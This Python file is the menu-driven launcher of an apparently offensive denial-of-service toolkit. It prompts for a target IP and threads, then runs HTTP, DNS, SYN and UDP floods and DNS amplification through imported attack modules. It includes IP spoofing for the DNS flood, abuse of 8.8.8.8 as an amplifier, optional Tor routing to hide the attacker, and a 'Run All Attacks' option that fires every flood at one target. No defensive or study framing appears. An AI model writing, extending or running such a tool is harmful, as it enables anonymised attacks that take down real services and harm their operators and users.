import logging
import sys
import threading
from concurrent.futures import ThreadPoolExecutor
from attack_manager import AttackManager
from httpFlod.http_flood import HttpFlood
from dnsFlod.dns_flood import DnsFlood
from udpFlod.udp_flood import UdpFlood
from synFlod.syn_flood import SynFlood
from dnsAmplificationFlod.dns_aplification import DnsAmplification
from tor_integration import check_tor_connection
from colorama import init, Fore

init(autoreset=True)

class Main:
    def __init__(self):
        self.attack_manager = AttackManager()
        self.use_tor = False
        self.executor = ThreadPoolExecutor(max_workers=10)

    def menu(self):
        options = [
            "Run HTTP Flood Attack",
            "Run DNS Flood Attack",
            "Run SYN Flood Attack",
            "Run UDP Flood Attack",
            "Run DNS Amplification Attack",
            "Connect to Tor",
            "Run All Attacks",
            "View Status of Active Attacks",
            "Shutdown All Attacks",
            "Exit"
        ]
        print("=== Attack Menu ===")
        for idx, option in enumerate(options, 1):
            print(f"{idx}. {option}")

    def run(self):
        logging.info("Starting application")

        while True:
            self.menu()
            choice = input("Enter your choice: ")

            actions = {
                "1": self.run_http_flood_attack,
                "2": self.run_dns_flood_attack,
                "3": self.run_syn_flood_attack,
                "4": self.run_udp_flood_attack,
                "5": self.run_dns_amplification_attack,
                "6": self.connect_to_tor,
                "7": self.run_all_attacks,
                "8": self.view_status,
                "9": self.shutdown_all_attacks,
                "10": self.exit_application
            }

            action = actions.get(choice)
            if action:
                action()
            else:
                print(Fore.RED + "Invalid choice. Please enter a valid option.")

    def run_http_flood_attack(self):
        target_ip, target_port, thread_count = self.get_attack_parameters()
        if target_ip and target_port and thread_count:
            http_flood = HttpFlood(target_ip, target_port, self.use_tor)
            self.attack_manager.run_attack(http_flood, thread_count)

    def run_dns_flood_attack(self):
        target_ip, target_port, thread_count = self.get_attack_parameters()
        if target_ip and target_port and thread_count:
            extensions = ["com", "xyz", "me", "top", "id", "net", "org", "info", "world", "click"]
            dns_flood = DnsFlood(target_ip, target_port, extensions, max_packets=50000, max_duration=30, interval_range=(0.01, 0.1), log_to_file=True, spoof_ip=True)
            self.attack_manager.run_attack(dns_flood, thread_count)

    def run_syn_flood_attack(self):
        target_ip, target_port, thread_count = self.get_attack_parameters()
        if target_ip and target_port and thread_count:
            num_syns = 1000
            interval = 0.1
            syn_flood = SynFlood(target_ip, target_port, num_syns, interval)
            self.attack_manager.run_attack(syn_flood, thread_count)

    def run_udp_flood_attack(self):
        target_ip, target_port, thread_count = self.get_attack_parameters()
        if target_ip and target_port and thread_count:
            packet_size = 1024
            udp_flood = UdpFlood(target_ip, target_port, packet_size)
            self.attack_manager.run_attack(udp_flood, thread_count)

    def run_dns_amplification_attack(self):
        target_ip = input("Enter target IP: ")
        dns_server_ip = input("Enter DNS server IP: ")
        thread_count = int(input("Enter number of threads: "))

        dns_amplification = DnsAmplification(target_ip, dns_server_ip, num_threads=thread_count)
        self.attack_manager.run_attack(dns_amplification, thread_count)

    def connect_to_tor(self):
        tor_connected = check_tor_connection()
        if tor_connected:
            self.use_tor = True
            print(Fore.GREEN + "Connected to Tor successfully.")
        else:
            print(Fore.RED + "Failed to connect to Tor.")

    def run_all_attacks(self):
        target_ip = input("Enter target IP: ")
        thread_count = int(input("Enter number of threads per attack: "))

        http_flood = HttpFlood(target_ip, 80, self.use_tor)
        extensions = ["com", "xyz", "me", "top", "id", "net", "org", "info", "world"]
        dns_flood = DnsFlood(target_ip, 53, extensions, max_packets=50000, max_duration=30, interval_range=(0.01, 0.1), log_to_file=True, spoof_ip=True)
        udp_flood = UdpFlood(target_ip, 53, packet_size=1024)
        syn_flood = SynFlood(target_ip, 53, 1000, 0.1)
        dns_amplification = DnsAmplification(target_ip, '8.8.8.8', num_threads=thread_count)

        attacks = [http_flood, dns_flood, udp_flood, syn_flood, dns_amplification]

        def run_attack(attack):
            self.attack_manager.run_attack(attack, thread_count)

        threads = [threading.Thread(target=run_attack, args=(attack,)) for attack in attacks]
        for thread in threads:
            thread.start()
        for thread in threads:
            thread.join()

    def shutdown_all_attacks(self):
        self.attack_manager.shutdown()

    def view_status(self):
        status = self.attack_manager.get_status()
        if not status:
            print("No active attacks.")
        else:
            for attack_id, info in status.items():
                print(f"Attack ID: {attack_id}")
                print(f"  Target IP: {info['target_ip']}")
                print(f"  Target Port: {info['target_port']}")
                print(f"  Running: {'Yes' if info['is_running'] else 'No'}")

    def get_attack_parameters(self):
        try:
            target_ip = input("Enter target IP: ")
            target_port = int(input("Enter target port: "))
            thread_count = int(input("Enter number of threads: "))
            return target_ip, target_port, thread_count
        except ValueError:
            print(Fore.RED + "Invalid input. Please enter valid parameters.")
            return None, None, None

    def exit_application(self):
        print("Exiting...")
        self.shutdown_all_attacks()
        sys.exit(0)

if __name__ == "__main__":
    logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')

    main_app = Main()
    try:
        main_app.run()
    except KeyboardInterrupt:
        logging.info("Received Ctrl+C. Shutting down...")
        main_app.shutdown_all_attacks()
        sys.exit(0)
